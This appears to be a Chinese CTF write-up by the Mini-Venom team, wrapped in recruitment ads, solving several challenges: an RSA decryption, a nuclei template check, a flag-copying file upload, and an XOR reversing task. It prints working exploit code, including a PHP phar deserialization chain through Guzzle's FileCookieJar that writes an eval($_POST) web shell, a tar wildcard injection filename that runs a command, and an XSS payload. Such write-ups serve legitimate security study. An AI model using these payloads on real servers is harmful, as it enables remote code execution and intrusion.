# 掌控安全CTF挑战赛 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/201604.html
> ID: 201604

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

/api/v1/version

/api/v2/echo

从 /api/v2/echo/ 终端节点读取响应，然后检查响应正文 （body_1） 是否包含特定内容，

包括 “NAME”：“HACKER” 和 “msg”：“success”。此检查不区分大小写。

在 body_2 上执行正则表达式匹配，查找模式 zkaq{[a-z]}。

会检查body_2是否包含字符串“<script>alert（1111）</script>”。

确保 HTTP 状态代码为 200 （status_code_2 == 200）。

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from Crypto.Util.number import *
n= 43489217925558007563636756391400797378149529574751021903496069282535133839006866223260410550599538413407426964614588006275007400246991078260390312195904589721338428085434172399719461589261992218665591773334129943107225575727780195166055393685218448420720438980410624810057704307625828329627767464148252758001
e= 65537
c= 36130878068248402738560299131646475603724825552357501315563339107931689677118969949120034243479180229973732010106235105382800417726466593880006557216051126730665469539293176332289284136350093429079449794175396650185724862085491944146833903655679903611518298996520196270292730040114431445396188731766010616304
p = 81207361375222669491316104953044746246400146737625592406724026490508197814501
phi = p ** 3 * (p - 1)
d = inverse(e, phi)
print(d)
print(pow(c,d,n))
print(long_to_bytes(pow(c, d, n)))
```



```
<?php show_source(__FILE__); file($_POST['a']); ?>
```



```
<?php  
namespace GuzzleHttpCookie {  
    class CookieJar  
    {  
        private $cookies;  
        public function __construct()  
        {  
            $this->cookies = array(new SetCookie());  
        }  
        private $strictMode;  
    }  
    class FileCookieJar extends CookieJar  
    {  
        private $filename = "/var/www/html/shell.php";  
        private $storeSessionCookies = true;  
    }  
    class SetCookie  
    {  
        private $data = array('Expires' => '<?php eval($_POST[0]);?>');  
    }  
}  
namespace {  
    $phar = new Phar("shell.phar"); //后缀名必须为phar  
    $phar->startBuffering();  
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub  
    $o = new GuzzleHttpCookieFileCookieJar();  
    $phar->setMetadata($o); //将⾃定义的meta-data存⼊manifest  
    $phar->addFromString("test.txt", "test"); //添加要压缩的⽂件  
    //签名⾃动计算  
    $phar->stopBuffering();  
}
```



```
import flask
import subprocess
import re

app = Flask(__name__)

... ...

@app.route('/submit', methods=['POST'])
def submit():
    ... ...
    if url is None:
        return "No URL！ ", 400

    if not url_pattern.match(url):
        return "URL格式错误！", 400

    if url:
        command = ['./nuclei', '--silent', '-u', url, '-t', '0day-templates.yaml']
        try:
            result = subprocess.run(command, capture_output=True, text=True)
            print(result.stdout)
            if 'info' in result.stdout and '/api/v2/echo' in result.stdout and 'custom-templates' in result.stdout:
                return flag
            else:
                return "非常安全，没有问题！"
        except subprocess.CalledProcessError:
            return "Error occurred while running command"
    return "Invalid request"

if __name__ == '__main__':
    ... ...
```



```
id: custom-templates

info:
  name: woowohhhhhhh
  author: xxx
  severity: info
  reference: https://xxx.com
  metadata:
    max-request: 2
  tags: ctf,zkaq

http:
  - raw:

      - |
        GET /api/v1/version/ HTTP/1.1
        Host: {{Hostname}}
        Referer: https://xxx.com

      - |
        GET /api/v2/echo/?name=<script>alert(1111)</script>&file=/etc/p0sswd_95271834 HTTP/1.1
        Host: {{Hostname}}
        Referer: https://xxx.com

    req-condition: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - compare_versions(version, '<= 10.0.5', '> 10.0.1')

      - type: word
        part: body_1
        words:
          - ""NAME":"HACKER""
          - ""msg":"success""
        condition: and
        case-insensitive: true

      - type: dsl
        dsl:
          - "regex('zkaq{[a-z]}', body_2)"
          - 'contains(body_2, "<script>alert(1111)</script>")'
          - "status_code_2 == 200"
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: version
        group: 1
        internal: true
        part: body_1
        regex:
          - ""version":"([0-9.]+)""
```



```
<!DOCTYPE html>
<html>
<head>
    <title>First Endpoint</title>
</head>
<body>
    <p>{"NAME":"HACKER","msg":"success","version":"10.0.4"}</p>
</body>
```



```
<!DOCTYPE html>
<html>
<head>
    <title>Second Endpoint</title>
</head>
<body>
    <p>xxxcom</p>
    <p>zkaq{a}</p>
    <script>alert(1111)</script>
</body>
</html>
```



```
python3 -m http.server 9999
```



```
# upload file
@app.route('/api/upload', methods=['POST'])
def upload():
    file = request.files.get('file', None)
    if file is None:
        return 'No file provided', 400
    
    # check for path traversal
    if '..' in file.filename or '/' in file.filename:
        return 'Invalid file name', 400
    
    # check file size
    if len(file.read()) > 1000:
        return 'File too large', 400
    
    file.save(f'uploads/{g.uuid}/{file.filename}')
    return 'Success! <script>setTimeout(function() {window.location="/"}, 3000)</script>', 200

# download file
@app.route('/api/download', methods=['GET'])
def download():
    @after_this_request
    def remove_file(response):
        os.system(f"rm -rf uploads/{g.uuid}/out.tar")
        return response

    # make a tar of all files
    os.system(f"cd uploads/{g.uuid}/ && tar -cf out.tar *")

    # send tar to user
    return send_file(f"uploads/{g.uuid}/out.tar", as_attachment=True, download_name='download.tar', mimetype='application/octet-stream')
```



```
os.system(f"cd uploads/{g.uuid}/ && tar -cf out.tar *")
```



```
--checkpoint-action=exec=python3 -c "import os;x = chr(47);os.system(f'cp {x}flag* .')"
```



```
--checkpoint=1
```



```
tmp=[
  0x19, 0x37, 0x35, 0x36, 0x08, 0x1B,0x36,0x3E,0xD4,0xE6,
  0x0A,  0x3C,0xE6, 0x5A, 0x29,  
  0x16, 0x15 ,0x7D ,0x1D ,0x4B, 
  0xD0, 0x2E ,0xC2  ,0xCC ,0x38 
  ,0x0B ,0xD9 ,0x98,0x26
]

opcode = [0x7f,0x5b,0x54,0x51,0x73,0x48,0x5E,0x57,0xBA,0xB9,0x4B,0x55,0xB9,0x14,0x48,0x49,0x47,0x08,0x42,0x0A,0xBE,0x4F,0xB6,0xAD,0x67,0x43,0xBC,0xB9,0x5B]

for i in range(len(opcode)):
    print(chr(opcode[i]^tmp[i]),end='')
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/8-1724806956.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/9-1724806956.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/7-1724806957.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/1-1724806957.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/3-1724806958.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/7-1724806959.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/5-1724806959.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/9-1724806960.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/8-1724806960.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/2-1724806961.png)